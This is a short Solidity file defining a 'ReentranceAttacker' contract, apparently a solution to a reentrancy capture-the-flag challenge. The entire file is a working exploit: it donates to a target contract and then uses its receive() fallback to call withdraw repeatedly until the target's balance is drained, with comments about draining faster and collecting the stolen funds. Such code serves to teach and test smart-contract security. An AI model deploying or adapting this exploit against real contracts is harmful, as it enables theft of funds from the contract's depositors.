// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

contract ReentranceAttacker  {
  
  Reentrance public reentranceContract;
  uint256 public amountDonated;
  address public owner;

  modifier onlyOwner() {
    require(msg.sender == owner, "caller is not the owner");
    _;
  }

  constructor (address payable _reentranceAddress) public {
    reentranceContract = Reentrance(_reentranceAddress);
    owner = msg.sender;
  }

  function donateAndSteal() external payable onlyOwner {
    amountDonated = msg.value;
    reentranceContract.donate.value(msg.value)(address(this));
    reentranceContract.withdraw(amountDonated);
  }

  receive() external payable {
    uint256 reentranceContractBalance = address(reentranceContract).balance;
    if(reentranceContractBalance >= amountDonated)
      reentranceContract.withdraw(amountDonated);
    // with this way we can drain the contract faster, instead of making a small donation ..
    else if(reentranceContractBalance > 0 && reentranceContractBalance < amountDonated)
      reentranceContract.withdraw(reentranceContractBalance);
  }

  // optional: we can also make a withdraw function to get all funds stolen
}